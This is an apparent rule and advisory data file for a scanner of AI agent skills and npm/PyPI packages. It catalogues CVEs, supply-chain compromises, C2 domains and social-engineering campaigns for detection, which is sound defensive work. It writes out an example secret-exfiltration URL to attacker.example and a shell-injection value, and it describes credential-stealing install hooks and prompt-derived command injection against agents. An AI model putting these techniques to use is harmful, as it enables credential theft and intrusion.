  { id: "PSV-089", category: "PSV", severity: "BLOCK", title: "Hermes WebUI arbitrary file deletion + path traversal (CVE-2026-6832/6829, hermes-webui < 0.50.34)", description: "CVE-2026-6832 (CVSS 8.1 HIGH, CWE-22) and CVE-2026-6829 (CVSS 5.3 MEDIUM, CWE-22) are path traversal vulnerabilities in the hermes-webui npm package (nesquena/hermes-webui) prior to version 0.50.34. CVE-2026-6832 affects the /api/session/delete endpoint: it constructs the deletion path by concatenating SESSION_DIR with the user-supplied session_id parameter without sanitization, allowing an authenticated attacker to supply an absolute path or path traversal sequence to delete arbitrary writable files on the host. CVE-2026-6829 affects workspace-management endpoints (/api/session/new, /api/session/update, /api/chat/start, /api/workspaces/add) that accept user-supplied workspace path parameters without sanitization, enabling authenticated directory traversal reads. AI agent orchestration frameworks that deploy Hermes as a local WebUI server (e.g., NousResearch/hermes-agent) inherit both vulnerabilities. Upgrade hermes-webui to 0.50.34 or later.", tags: ["hermes-webui", "path-traversal", "file-deletion", "cve-2026-6832", "cve-2026-6829"] },
  { id: "PSV-090", category: "PSV", severity: "BLOCK", title: "MS-Agent (ModelScope) command injection via prompt-derived input (CVE-2026-2256, GHSA-4gc2-344q-r2rw, pip ms-agent <= 1.6.0rc1, no fix)", description: "CVE-2026-2256 (GHSA-4gc2-344q-r2rw, CERT VU#431821, CVSS 6.5, CWE-77) is a command injection vulnerability in ModelScope MS-Agent (pip ms-agent <= 1.6.0rc1). Prompt-derived input is passed to OS shell execution without adequate sanitization. The check_safe() validation function uses a regex-based denylist that can be bypassed via command obfuscation, encoding, or alternative shell syntax, allowing unauthenticated network attackers to execute arbitrary OS commands with the privileges of the ms-agent process. No patch is available as of 2026-06-01. Mitigate by not exposing ms-agent on publicly reachable interfaces, filtering external inputs at the application boundary before they reach the agent, and monitoring for unexpected subprocess spawning from the ms-agent process.", tags: ["ms-agent", "modelscope", "command-injection", "cve-2026-2256"] },
  { id: "PSV-091", category: "PSV", severity: "WARN", title: "OpenClaw IDENTITY.md symlink traversal — arbitrary file write via agents.create/update (CVE-2026-35632, GHSA-7xr2-q9vf-x4r5, openclaw <= 2026.2.22, no fix)", description: "CVE-2026-35632 (GHSA-7xr2-q9vf-x4r5, CVSS 6.9, CWE-61) is an incomplete patch for a prior symlink traversal in OpenClaw (npm openclaw <= 2026.2.22). The agents.create and agents.update API handlers call fs.appendFile on the IDENTITY.md file without any symlink containment check. An attacker with workspace access can plant a symlink at IDENTITY.md pointing to a sensitive file such as /etc/crontab or ~/.ssh/authorized_keys; the append then writes attacker-controlled agent metadata to that target, enabling privilege escalation or persistent shell access. No fix is available. Mitigate by upgrading to OpenClaw versions with full symlink containment (check the OpenClaw CVE tracker at github.com/jgamblin/OpenClawCVEs for patch status) and by auditing IDENTITY.md for symlink targeting in workspace directories.", tags: ["openclaw", "symlink", "arbitrary-file-write", "cve-2026-35632"] },
  { id: "PSV-092", category: "PSV", severity: "BLOCK", title: "PraisonAI _safe_extractall symlink bypass — arbitrary file write outside dest_dir (CVE-2026-44340, GHSA-9q28-ghcr-c4x3, pip praisonai <= 4.6.36, fixed 4.6.37)", description: "CVE-2026-44340 (GHSA-9q28-ghcr-c4x3, CVSS 8.7, CWE-22/CWE-59) is a symlink-extraction bypass in PraisonAI pip package <= 4.6.36. The _safe_extractall helper validates member file names but fails to inspect member.linkname or reject symlink/hardlink members. A malicious bundle can include a symlink with a name inside dest_dir but a linkname pointing outside it; a subsequent file traverses through the symlink and writes arbitrary content to any path accessible by the process, enabling credential theft, SSH key injection, or cron-based persistence. Upgrade praisonai to 4.6.37 or later.", tags: ["praisonai", "symlink", "path-traversal", "arbitrary-file-write", "cve-2026-44340"] },
  { id: "PSV-093", category: "PSV", severity: "BLOCK", title: "LibreChat server-side env-var expansion in MCP server URL — credential disclosure (CVE-2026-32625, GHSA-pmw7-gqwj-f954, CVSS 9.6, <= 0.8.3)", description: "CVE-2026-32625 (GHSA-pmw7-gqwj-f954, CVSS 9.6 Critical, CWE-200, disclosed June 2, 2026) is a server-side environment-variable injection vulnerability in LibreChat <= 0.8.3. When an authenticated user configures an MCP server, LibreChat resolves ${VAR} placeholders in the user-supplied URL against its own process.env during Zod schema validation — before making any outbound connection. An attacker can embed ${CREDS_KEY}, ${CREDS_IV}, ${JWT_SECRET}, and ${MONGO_URI} in the MCP server URL (e.g. https://attacker.example/?k=${CREDS_KEY}&j=${JWT_SECRET}). LibreChat expands these and connects to the attacker server with the plaintext secrets in the URL, enabling full instance compromise (decryption of stored credentials, database access, JWT forgery). No elevated privileges required — any authenticated low-privilege account suffices. Upgrade to LibreChat 0.8.4-rc1 or later. Audit MCP server URL configurations for embedded ${...} references.", tags: ["librechat", "mcp", "env-var-injection", "credential-disclosure", "cve-2026-32625"] },
  // SE — Social Engineering
  { id: "SE-001", category: "SE", severity: "BLOCK", title: "Social engineering credential harvest instruction", description: "Remove instructions that direct the AI to solicit credentials, tokens, or secrets from users. Skills must never instruct the model to collect authentication material on behalf of a service. Use OAuth, delegated auth flows, or environment-variable injection instead. ", tags: ["credential_harvest", "instruction_abuse"] },
  { id: "SE-002", category: "SE", severity: "BLOCK", title: "Git credential file harvest combined with send or upload instruction", description: "This skill reads Git credential files (~/.gitconfig, ~/.git-credentials) and transmits their contents to an external endpoint. Git credential files contain plaintext usernames and tokens for remote repositories. This is a targeted credential harvest attack. Skills must never read or transmit Git credential files. Use scoped, short-lived tokens via OAuth or environment-variable injection instead of reading credential files. ", tags: ["social-engineering", "credential-harvest", "git-credentials", "exfiltration"] },
  { id: "SE-003", category: "SE", severity: "BLOCK", title: "Prize or reward scam with credential or account request", description: "Prize, reward, and winner-notification framing combined with requests for credentials, API keys, or account verification is a classic social engineering attack pattern. Skills must never offer rewards contingent on providing authentication material. Remove any prize/reward language that is coupled with credential requests or account verification steps. Use OAuth or delegated auth flows for legitimate authentication needs. ", tags: ["social-engineering", "prize-scam", "credential-harvest", "phishing", "reward-fraud"] },
  { id: "SE-004", category: "SE", severity: "BLOCK", title: "EvilTokens OAuth device code phishing (PhaaS, Microsoft 365 token hijack)", description: "EvilTokens is a widespread phishing-as-a-service (PhaaS) campaign that exploits the OAuth 2.0 device code authentication flow to compromise Microsoft 365 organizational accounts at scale. Attackers send hyper-personalized lures (RFPs, invoices) generated with AI, directing victims to complete device code authentication for attacker-controlled devices. This bypasses MFA and standard access controls, yielding persistent refresh tokens. Disable device code flow in Entra ID Conditional Access policies unless strictly required, and train users to recognize device code phishing.", tags: ["phishing", "credential_harvest", "oauth", "eviltokens", "device_code"] },
  { id: "SE-005", category: "SE", severity: "BLOCK", title: "Obsidian shared vault social engineering lure (REF6598 / PHANTOMPULSE delivery)", description: "REF6598 (Elastic Security Labs, April 14 2026) is a targeted social engineering campaign delivering PHANTOMPULSE RAT via Obsidian shared vault abuse. Threat actors pose as venture capital firm representatives on LinkedIn, move targets to Telegram, and provide Obsidian account credentials to a pre-staged vault. Victims are instructed to enable community plugin sync, which pulls down a trojanized Shell Commands plugin (data.json) that executes attacker-controlled PowerShell/AppleScript on vault open. Targets are primarily in the financial and cryptocurrency sectors. Never accept Obsidian vault credentials from unknown parties, disable community plugin sync for untrusted vaults, and monitor for anomalous child process creation from Obsidian.exe.", tags: ["obsidian", "vault-abuse", "plugin-abuse", "linkedin", "telegram", "crypto", "ref6598"] },
  { id: "SE-006", category: "SE", severity: "BLOCK", title: "ATHR AI vishing platform: automated telephone-oriented attack delivery with AI voice agents (April 2026)", description: "ATHR is a criminal platform-as-a-service (PaaS) for automated telephone-oriented attack delivery (TOAD), disclosed by Abnormal AI in April 2026. For $4,000 plus 10% of profits, operators receive a browser-based dashboard, a built-in mailer with brand-specific email templates (Google, Microsoft, Coinbase, Binance, Gemini, Crypto.com, Yahoo, AOL), and a telephony layer that routes callbacks to either human operators or AI voice agents. The AI agents follow structured multi-step scripts to extract 6-digit verification codes. The platform supports real-time call monitoring, lure customization (location, timestamp, IP spoofing), and conversion analytics. Unlike earlier TOAD platforms, ATHR removes the human-caller bottleneck entirely. Skills or agents that reference ATHR, TOAD callback phishing, or AI voice agent credential harvesting should be treated as social engineering infrastructure. Train users to never call numbers embedded in security alert emails; verify alerts through official app or website channels only.", tags: ["athr", "vishing", "toad", "callback-phishing", "ai-voice-agent", "paas"] },
  // SUP — Supply Chain
  { id: "SUP-001", category: "SUP", severity: "BLOCK", title: "npm lifecycle script pipes remote content to shell", description: "npm lifecycle scripts must not fetch and execute remote content. Use pinned, audited dependencies instead.", tags: ["npm", "lifecycle-script"] },
  { id: "SUP-002", category: "SUP", severity: "BLOCK", title: "npx registry fallback execution without --no-install", description: "Avoid implicit npx registry fallback. Prefer explicit local installs and use `npx --no-install` for command execution.", tags: [] },
  { id: "SUP-003", category: "SUP", severity: "BLOCK", title: "Piped sed write to out-of-scope or agent config path", description: "Avoid shell-based piped rewrite chains that redirect into `.claude/` or parent-directory paths. Use scoped file APIs with explicit path allowlists.", tags: [] },
  { id: "SUP-004", category: "SUP", severity: "BLOCK", title: "npm preinstall/postinstall shell bootstrap pattern", description: "Remove shell/bootstrap execution from npm preinstall/postinstall hooks. Use explicit reviewed setup steps outside lifecycle scripts.", tags: [] },
  { id: "SUP-005", category: "SUP", severity: "BLOCK", title: "npm preinstall/postinstall inline Node eval pattern", description: "Remove inline `node -e/--eval` execution from npm install lifecycle hooks. Use reviewed version-controlled scripts with explicit file paths.", tags: [] },
  { id: "SUP-006", category: "SUP", severity: "BLOCK", title: "Dotenv newline environment-variable injection payload marker", description: "Reject newline/carriage-return characters in token inputs before writing `.env` files. Update env values via strict key allowlists and escaped serialization.", tags: [] },
  { id: "SUP-007", category: "SUP", severity: "BLOCK", title: "npm preinstall/postinstall global package install pattern", description: "Remove global package installation from npm install lifecycle hooks. Keep dependency setup explicit, pinned, and user-initiated outside preinstall/postinstall.", tags: [] },
  { id: "SUP-008", category: "SUP", severity: "BLOCK", title: "npm lifecycle mutable @latest dependency install pattern", description: "Avoid `npm install ...@latest` inside install lifecycle hooks. Use pinned versions and explicit user-initiated install/update steps outside preinstall/postinstall.", tags: [] },
  { id: "SUP-009", category: "SUP", severity: "BLOCK", title: "Hex-decoded command string execution marker", description: "Treat install/setup scripts that decode long hex strings and immediately execute them as suspicious. Replace with reviewed, plaintext commands in version-controlled scripts.", tags: [] },
  { id: "SUP-010", category: "SUP", severity: "BLOCK", title: "npm postinstall environment variable exfiltration via webhook or agentmail", description: "Remove postinstall scripts that collect environment variables and transmit them to external endpoints such as webhook.site or agentmail services. This pattern detects the sbx-mask/touch-adv npm supply chain attack documented by Sonatype.", tags: [] },
  { id: "SUP-011", category: "SUP", severity: "BLOCK", title: "Open VSX extensionPack/extensionDependencies transitive dependency attack", description: "Do not trust extensions that use extensionPack or extensionDependencies to pull in unknown or suspicious transitive extensions. This pattern detects the GlassWorm supply chain technique of using clean-looking extensions as delivery vehicles for malicious payloads via Open VSX dependency chains.", tags: [] },
  { id: "SUP-012", category: "SUP", severity: "BLOCK", title: "npm dependency chain attack via hollow relay package with postinstall loader", description: "Remove postinstall hooks that execute standalone JavaScript loader files such as init.js or child.js. This pattern detects the GlassWorm/ForceMemo three-layer dependency chain attack where compromised packages use hollow relay scoped packages to deliver Solana blockchain C2 malware via postinstall hooks.", tags: [] },
  { id: "SUP-013", category: "SUP", severity: "BLOCK", title: "MCP server command injection via unsanitized Git parameters", description: "Do not use vulnerable MCP server packages that pass unsanitized user input to shell commands. CVE-2026-4198 affects mcp-server-auto-commit (getGitChanges RCE) and CVE-2026-4496 affects sigmade/Git-MCP-Server (OS command injection via child_process.exec in gitUtils.ts).", tags: [] },
  { id: "SUP-014", category: "SUP", severity: "BLOCK", title: "Azure MCP Server SSRF privilege escalation (CVE-2026-26118)", description: "Update Azure MCP Server Tools to the patched version. CVE-2026-26118 is a server-side request forgery vulnerability in Azure MCP Server Tools (CVSS 8.8) that allows an authorized attacker to escalate privileges over a network. Do not expose Azure MCP Server endpoints to untrusted networks without patching.", tags: ["azure", "mcp-server", "ssrf", "privilege-escalation", "cve"] },
  { id: "SUP-015", category: "SUP", severity: "BLOCK", title: "GitHub Actions supply chain compromise via release tag repointing", description: "Pin GitHub Actions to full commit SHAs instead of mutable tags. The trivy-action supply chain compromise repointed 76 of 77 release tags to a malicious commit containing a credential stealer in entrypoint.sh. Always verify action integrity via SHA pinning and monitor for unexpected tag changes.", tags: ["github-actions", "supply-chain", "tag-repointing", "credential-theft", "trivy"] },
  { id: "SUP-016", category: "SUP", severity: "BLOCK", title: "Vulnerable MCP server package with command injection", description: "Update or remove vulnerable MCP server packages. CVE-2026-4198 affects mcp-server-auto-commit 1.0.0 (command injection in getGitChanges). CVE-2026-4192 affects quip-mcp-server 1.0.0 (RCE). CVE-2026-33252 affects MCP Go SDK <= 1.4.0 (CSRF enables arbitrary tool execution via cross-site POST requests). Update to patched versions immediately.", tags: ["mcp", "supply-chain", "command-injection", "rce", "cve", "vulnerability"] },
  { id: "SUP-017", category: "SUP", severity: "BLOCK", title: "Checkmarx GitHub Actions supply chain compromise (TeamPCP)", description: "TeamPCP compromised Checkmarx GitHub Actions (ast-github-action, kics-github-action) by force-pushing malicious commits to release tags (CVE-2026-33634). The malware exfiltrates SSH keys, cloud credentials, and CI/CD secrets to checkmarx.zone. Pin all GitHub Actions to full commit SHAs instead of mutable tags. Audit CI/CD logs for connections to checkmarx.zone.", tags: ["supply-chain", "github-actions", "checkmarx", "teampcp", "credential-theft", "tag-repointing"] },
  { id: "SUP-018", category: "SUP", severity: "WARN", title: "pip install in skill body with non-standard or suspicious package name", description: "This skill installs Python packages via pip in the skill body, referencing a package name that is not in the known-safe allowlist. Installing arbitrary packages at runtime is a supply chain risk — package names can be typosquatted, the package may be malicious, or the version may be pinned to a known-vulnerable release. Declare dependencies in a requirements.txt or pyproject.toml and review them before use. Do not install packages dynamically in skill instructions. ", tags: ["supply-chain", "pip-install", "runtime-dependency", "typosquatting"] },
  { id: "SUP-019", category: "SUP", severity: "BLOCK", title: "Compromised LiteLLM package version reference", description: "LiteLLM versions 1.82.7 and 1.82.8 are known-malicious, compromised by TeamPCP via a poisoned Trivy scanner. These versions contain a multi-stage credential stealer that harvests SSH keys, cloud credentials, Kubernetes secrets, and cryptocurrency wallets. Never install these versions. Update to a clean release and audit systems that may have been exposed. ", tags: ["supply-chain", "litellm", "teampcp", "compromised-package", "credential-theft"] },
  { id: "SUP-020", category: "SUP", severity: "BLOCK", title: "ClawHavoc malicious ClawHub skill typosquat names", description: "These skill names are known-malicious typosquats from the ClawHavoc campaign that planted 1,184+ malicious skills on ClawHub. They masquerade as cryptocurrency wallets, YouTube utilities, and trading tools but deliver Atomic Stealer (AMOS) on macOS, keyloggers on Windows, or reverse shell backdoors. Remove any reference to these skills immediately. ", tags: ["supply-chain", "clawhavoc", "typosquat", "openclaw", "clawhub"] },
  { id: "SUP-021", category: "SUP", severity: "BLOCK", title: "TeamPCP Checkmarx VS Code extension compromise (Open VSX)", description: "The TeamPCP threat actor published malicious versions of Checkmarx VS Code extensions on the Open VSX registry: checkmarx.ast-results version 2.53 and checkmarx.cx-dev-assist version 1.7.0. These extensions contain an infostealer that exfiltrates secrets, tokens, and cryptocurrency wallet information. Uninstall compromised versions immediately and audit for data exfiltration to checkmarx.zone. ", tags: ["supply-chain", "vscode-extension", "teampcp", "open-vsx", "infostealer"] },
  { id: "SUP-022", category: "SUP", severity: "BLOCK", title: "React Native npm account takeover supply chain attack", description: "The popular React Native packages react-native-international-phone-number (130K monthly downloads) and react-native-country-select were compromised via npm account takeover. Malicious versions (0.11.8, 0.12.1-0.12.3 and 0.3.91, 0.4.1-0.4.2 respectively) use multi-layer dependency chains through scoped packages @usebioerhold8733/s-format and @agnoliaarisian7180/string-argv to deliver malware. Remove compromised versions and audit for postinstall hook execution. ", tags: ["supply-chain", "npm", "account-takeover", "react-native", "dependency-chain"] },
  { id: "SUP-023", category: "SUP", severity: "BLOCK", title: "mcp-remote OAuth authorization_endpoint command injection (CVE-2025-6514)", description: "CVE-2025-6514 (CVSS 9.6 critical) affects mcp-remote npm versions 0.0.5-0.1.15. A malicious MCP server can return a crafted authorization_endpoint value during OAuth discovery (e.g., \"a:$(cmd.exe /c whoami)?response_type=code\") that is passed unsanitized to a shell, enabling full RCE on the MCP client. Upgrade mcp-remote to 0.1.16 or later. On Windows, monitor for PowerShell spawning with -EncodedCommand from MCP client processes. Pin authorization_endpoint values to https:// schemes.", tags: ["supply-chain", "mcp", "cve", "oauth", "command-injection", "rce"] },
  { id: "SUP-024", category: "SUP", severity: "BLOCK", title: "Compromised axios npm versions (TeamPCP RAT dropper, March 2026)", description: "axios versions 1.14.1 and 0.30.4 were compromised on March 30, 2026 via a hijacked maintainer npm account (jasonsaayman). The malicious versions inject a hidden dependency, plain-crypto-js@4.2.1, whose sole purpose is a postinstall script that drops a cross-platform RAT targeting macOS, Windows, and Linux. The RAT exfiltrates SSH keys, cloud tokens, and credentials to sfrclak.com:8000 (IP 142.11.206.73). Although removed within hours, these versions were present in ~80% of cloud environments. Upgrade to axios@1.7.9 or later (1.x) / axios@0.29.0 or later (0.x). Audit node_modules for plain-crypto-js. This attack is linked to the TeamPCP supply chain campaign.", tags: ["supply-chain", "npm", "account-takeover", "rat", "teampcp", "axios"] },
  { id: "SUP-025", category: "SUP", severity: "BLOCK", title: "ClawHub ranking manipulation vulnerability", description: "A vulnerability in ClawHub allowed attackers to artificially inflate download counts of malicious skills by exploiting an exposed internalMutation endpoint. This was used to push malicious skills to the #1 spot. Ensure that any skill interacting with ClawHub does not attempt to manipulate download counts or use internal mutations for public endpoints.", tags: ["supply-chain", "clawhub", "openclaw", "ranking-manipulation"] },
  { id: "SUP-026", category: "SUP", severity: "BLOCK", title: "MaliciousCorgi VS Code AI Extensions Data Exfiltration", description: "The MaliciousCorgi campaign involves VS Code extensions (ChatGPT - 中文版 and ChatMoss) that silently exfiltrate source code and developer profiles to Chinese servers (aihao123.cn). Uninstall these extensions immediately and rotate any exposed credentials.", tags: ["vscode", "maliciouscorgi", "exfiltration"] },
  { id: "SUP-027", category: "SUP", severity: "BLOCK", title: "Compromised Telnyx package version reference", description: "Telnyx versions 4.87.1 and 4.87.2 are known-malicious, compromised by TeamPCP to deliver a WAV steganography credential stealer. Upgrade to a safe version (e.g., 4.87.3 or later) immediately.", tags: ["telnyx", "teampcp"] },
  { id: "SUP-028", category: "SUP", severity: "BLOCK", title: "UNC1069 social engineering lure domain (teams.onlivemeet.com)", description: "teams.onlivemeet.com is a known-malicious domain operated by UNC1069 (Sapphire Sleet / North Korean APT). The domain impersonates Microsoft Teams to trick open-source npm/Node.js maintainers into joining fake video calls, during which a RAT is installed. The compromised maintainer accounts are then used to publish malicious npm packages (e.g., axios 1.14.1 and 0.30.4 in the March 2026 Axios supply chain attack). Any reference to this domain in a skill or workflow is a strong indicator of compromise. Report to your security team immediately.", tags: ["unc1069", "sapphire-sleet", "north-korea", "social-engineering", "npm", "axios"] },
  { id: "SUP-029", category: "SUP", severity: "BLOCK", title: "Malicious Strapi npm packages (Redis RCE / Credential Harvesting)", description: "36 malicious npm packages disguised as Strapi CMS plugins were discovered in April 2026. These packages use postinstall scripts to exploit Redis and PostgreSQL, deploy reverse shells, harvest credentials, and drop persistent implants. Remove the package immediately and rotate all credentials, especially Redis, PostgreSQL, and cryptocurrency wallet keys.", tags: ["npm", "strapi", "redis", "rce", "credential-harvesting"] },
  { id: "SUP-030", category: "SUP", severity: "BLOCK", title: "a11y-mcp SSRF vulnerability (CVE-2026-5323)", description: "Update a11y-mcp to a patched version.", tags: ["supply-chain", "mcp", "ssrf", "cve-2026-5323", "a11y"] },
  { id: "SUP-031", category: "SUP", severity: "BLOCK", title: "PackageGate npm/pnpm lifecycle script security bypass (CVE-2025-69264, CVE-2025-69263)", description: "CVE-2025-69264 (pnpm) and CVE-2025-69263 (pnpm) are zero-day vulnerabilities discovered in January 2026 (PackageGate research) that allow attackers to bypass the --ignore-scripts flag and lockfile integrity checks in JavaScript package managers (npm, pnpm, vlt, Bun). Attackers can exploit these flaws to force execution of malicious lifecycle scripts during package installation, even when security controls are enabled. Upgrade pnpm to 10.6.5+ and npm to 11.3.0+. Audit package.json and lockfiles for unexpected postinstall/preinstall scripts.", tags: ["supply-chain", "npm", "pnpm", "cve-2025-69264", "cve-2025-69263", "lifecycle-bypass", "packagegate", "zero-day"] },
  { id: "SUP-032", category: "SUP", severity: "BLOCK", title: "Compromised velora-dex/sdk package version reference", description: "@velora-dex/sdk version 9.4.1 is a known-malicious npm package that delivers the minirat Go RAT. Downgrade to 9.4.0 or upgrade to 9.4.2+ (once a clean release is available). Rotate all credentials on affected machines and check for the minirat persistence binary at ~/Library/Application Support/com.apple.Terminal/profiler.", tags: ["supply-chain", "npm", "velora-dex", "malicious-version", "rat"] },
  { id: "SUP-033", category: "SUP", severity: "BLOCK", title: "OpenVSX Code Extension Marketplace Zip Slip vulnerability (CVE-2026-35454, pre-2.4.2)", description: "CVE-2026-35454 is a Zip Slip path traversal vulnerability in the Open VSX Code Extension Marketplace (versions prior to 2.4.2). During extension installation, maliciously crafted .vsix archives can use relative path components (e.g., ../../) to write files outside the intended extraction directory, bypassing pre-publication security checks and enabling arbitrary file write on the marketplace server or client. Upgrade the Open VSX marketplace to version 2.4.2 or later. For self-hosted instances, validate all archive entry paths against the target extraction directory before extraction. For extension consumers, prefer the official VS Code Marketplace or verify extension integrity via publisher signatures.", tags: ["supply-chain", "openvsx", "zip-slip", "path-traversal", "vscode-extension", "marketplace", "cve-2026-35454"] },
  { id: "SUP-034", category: "SUP", severity: "WARN", title: "claude-code-action Arbitrary Code Execution via Malicious .mcp.json", description: "Tenable TRA-2026-27 identifies a vulnerability in claude-code-action (versions prior to 1.0.78) where a malicious .mcp.json file in a PR branch can lead to arbitrary command execution in the runner. Update claude-code-action to version 1.0.78 or later.", tags: ["claude-code-action", "mcp", "github-actions", "tra-2026-27"] },
  { id: "SUP-035", category: "SUP", severity: "BLOCK", title: "dom-utils-lite / centralogger npm SSH backdoor via Supabase C2", description: "dom-utils-lite and centralogger are malicious npm packages (SafeDep, April 14, 2026) published by npm account user0001 (tanvisoul9@gmail.com). Their postinstall hook (setup.js) fetches the attacker's SSH public key from a Supabase storage bucket (public_keys/main.pem.pub) and appends it to ~/.ssh/authorized_keys with the tag \"ssh-key-auto-sync\", granting the attacker persistent SSH access. The payload also exfiltrates victim IP, hostname, and username to Supabase storage (logs/{ip}_{hostname}.txt) and re-runs every 60 seconds with exponential backoff. C2 domains: xienztiavkygvacpqzgr.supabase.co (dom-utils-lite) and ndfcioahsbgsjmulpjgt.supabase.co (centralogger). Remove both packages immediately, revoke SSH access, and audit ~/.ssh/authorized_keys for the ssh-key-auto-sync tag.", tags: ["npm", "postinstall", "ssh-backdoor", "supabase", "authorized-keys", "credential-theft"] },
  { id: "SUP-036", category: "SUP", severity: "BLOCK", title: "TigerJack malicious VS Code extensions — keylogger, CoinIMP miner, and dynamic backdoor (ab498)", description: "TigerJack is a coordinated multi-account threat actor (discovered October 2025) that published at least 11 malicious VS Code extensions to the VSCode Marketplace and OpenVSX registry, accumulating 17,000+ downloads. Three attack patterns: (1) C++ Playground registers onDidChangeTextDocument to exfiltrate C++ source code to external endpoints in near-real-time (500ms delay); (2) HTTP Format runs a CoinIMP cryptocurrency miner with hardcoded credentials; (3) cppplayground/httpformat/pythonformat fetch and execute arbitrary JavaScript from ab498.pythonanywhere.com/static/in4.js every 20 minutes, enabling dynamic payload delivery (credential theft, ransomware, backdoor injection). Remove all TigerJack extensions immediately, rotate credentials, and audit for unauthorized network connections. Only install extensions from verified publishers.", tags: ["vscode", "extension", "keylogger", "cryptominer", "backdoor", "tigerjack", "coinimp", "openvsx"] },
  { id: "SUP-037", category: "SUP", severity: "BLOCK", title: "Fake Gemini npm package (gemini-ai-checker) — AI tool token stealer", description: "The gemini-ai-checker npm package (published March 20, 2026) is a malicious token stealer targeting AI developers. It downloads an OtterCookie payload from server-check-genimi.vercel.app, which steals credentials, crypto wallets, and specifically targets AI tool directories (.cursor, .claude, Windsurf, PearAI) to exfiltrate API keys and source code. Remove the package immediately, rotate all credentials and API keys, and audit for unauthorized access.", tags: ["npm", "gemini", "token-stealer", "ottercookie", "contagious-interview"] },
  { id: "SUP-038", category: "SUP", severity: "BLOCK", title: "Context.ai Chrome extension supply chain compromise (Vercel breach, April 2026)", description: "In April 2026, a compromised Context.ai employee account was used to gain access to a Vercel employee's Google Workspace, leading to a breach of Vercel's internal systems. The attack chain involved the Context.ai Chrome extension (ID: omddlmnhcofjbnbflmjginpjjblphbgk) and its Google OAuth client (110671459871-30f1spbu0hptbs60cb4vsmv79i7bbvqj.apps.googleusercontent.com). The stolen data was put up for sale on BreachForums. Remove the Context.ai Chrome extension, revoke associated OAuth grants, rotate all Vercel environment variables and API keys, and audit Google Workspace access logs.", tags: ["chrome-extension", "context-ai", "vercel", "oauth", "credential-theft"] },
  { id: "SUP-039", category: "SUP", severity: "BLOCK", title: "intercom-client@7.0.4/7.0.5 npm supply chain compromise (Mini Shai-Hulud, TeamPCP, April 2026)", description: "intercom-client@7.0.4 and 7.0.5 npm packages were compromised in the Mini Shai-Hulud / TeamPCP supply chain attack on April 30, 2026 (7.0.4 per Socket; 7.0.5 additionally confirmed by Wiz). The malicious versions introduce a preinstall hook (node setup.mjs) that executes an obfuscated payload to harvest GitHub, npm, and multi-cloud credentials. The payload specifically detects CI/CD environments (GitHub Actions, Vercel) and exfiltrates stolen secrets by authenticating to api.github.com, creating a private repository under the victim's account, and committing the harvested credentials there. This technique bypasses standard egress controls since the traffic goes to a trusted domain (GitHub). If this package was installed, immediately rotate all GitHub tokens, npm tokens, and cloud credentials.", tags: ["npm", "intercom-client", "shai-hulud", "mini-shai-hulud", "teampcp", "credential-stealer"] },
  { id: "SUP-040", category: "SUP", severity: "BLOCK", title: "Xinference PyPI supply chain compromise (TeamPCP-style credential harvester)", description: "Xinference versions 2.6.0, 2.6.1, and 2.6.2 on PyPI were compromised in a TeamPCP-style supply chain attack (April 22, 2026). The malicious payload in xinference/__init__.py runs on import, harvests SSH keys, cloud credentials, Kubernetes configs, .env files, and cryptocurrency wallets, then exfiltrates them to whereisitat.lucyatemysuperbox.space. Upgrade to 2.6.3 or later immediately. Treat any host that imported the package as compromised and rotate all secrets.", tags: ["pypi", "xinference", "teampcp", "credential-theft"] },
  { id: "SUP-041", category: "SUP", severity: "BLOCK", title: "Namastex CanisterWorm npm worm wave (automagik/genie, pgserve, fairwords packages)", description: "Namastex.ai npm packages were compromised in a TeamPCP-style CanisterWorm supply chain attack (April 21-22, 2026). Malicious versions of @automagik/genie (4.260421.33-4.260421.39), pgserve (1.1.11-1.1.13), @fairwords/websocket (1.0.38-1.0.39), and @fairwords/loopback-connector-es (1.4.3-1.4.4) steal developer credentials, browser data, and cryptocurrency wallets, then exfiltrate to telemetry.api-monitor.com and an ICP canister (cjn37-uyaaa-aaaac-qgnva-cai). The worm propagates by stealing npm tokens and republishing infected packages. Remove affected packages immediately and rotate all credentials.", tags: ["npm", "canisterworm", "namastex", "credential-theft", "worm"] },
  { id: "SUP-042", category: "SUP", severity: "BLOCK", title: "Shai-Hulud: @bitwarden/cli@2026.4.0 supply chain compromise (TeamPCP, April 2026)", description: "@bitwarden/cli version 2026.4.0 was compromised in a supply chain attack (TeamPCP, \"Shai-Hulud: The Third Coming\") active April 22, 2026, between 17:57 and 19:30 UTC. The malicious release introduces bw_setup.js via a preinstall hook. Once executed it bootstraps the Bun runtime and launches bw1.js, a credential harvester that steals SSH keys, cloud credentials, AI coding tool tokens (.claude, .cursor, Windsurf), MCP configuration files, and cryptocurrency wallets. Stolen data is AES-256-GCM encrypted and exfiltrated to audit.checkmarx.cx/v1/telemetry (a typosquat of the real Checkmarx domain). The worm then reads npm/PyPI publish tokens and re-injects itself into all packages the victim can publish. Remove @bitwarden/cli@2026.4.0 immediately, upgrade to a clean version, rotate all credentials (SSH keys, cloud secrets, npm/PyPI tokens, AI tool API keys), and audit packages you maintain for unexpected version bumps.", tags: ["npm", "bitwarden", "teampcp", "shai-hulud", "credential-theft", "worm"] },
  { id: "SUP-043", category: "SUP", severity: "BLOCK", title: "Checkmarx KICS Docker Hub supply chain compromise — mcpAddon.js credential stealer (April 2026)", description: "The official checkmarx/kics Docker Hub repository was compromised on April 22, 2026 (14:17–15:41 UTC). Attackers pushed a malicious image tagged v2.1.21 and temporarily repointed existing tags to the malicious digest. The image downloads mcpAddon.js from a hardcoded GitHub URL, which steals GitHub tokens, AWS/Azure/GCP credentials, npm tokens, SSH keys, Claude configs, and environment variables, then exfiltrates them to audit.checkmarx.cx (91.195.240.123 / 94.154.172.43). The same campaign also compromised Checkmarx VS Code and Open VSX extensions. Safe versions: DockerHub KICS v2.1.20, ast-github-action v2.3.36, VS Code extensions v2.64.0, Developer Assist v1.18.0. Block access to audit.checkmarx.cx (91.195.240.123 / 94.154.172.43). Rotate all credentials if the compromised image was pulled during the exposure window.", tags: ["docker", "checkmarx", "kics", "credential-theft", "mcpaddon"] },
